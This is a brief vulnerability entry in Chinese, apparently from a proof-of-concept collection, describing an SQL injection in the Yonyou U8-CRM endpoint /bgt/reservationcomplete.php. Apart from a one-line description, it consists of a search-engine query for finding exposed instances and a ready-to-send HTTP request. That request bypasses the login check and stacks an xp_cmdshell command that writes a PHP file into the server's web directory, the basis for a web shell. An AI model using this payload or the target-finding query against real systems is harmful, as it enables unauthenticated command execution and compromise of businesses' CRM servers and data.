# 用友U8-CRM系统接口reservationcomplete.php存在SQL注入漏洞

用友U8-CRM系统接口 /bgt/reservationcomplete.php 存在SQL注入漏洞

## hunter

```yaml
app.name="用友 CRM"
```

## poc

```java
GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27echo%20^%3C?php%20echo%20hello;?^%3E%20%3E%20D:\U8SOFT\turbocrm70\code\www\hello.php%27; HTTP/1.1
Host:
```

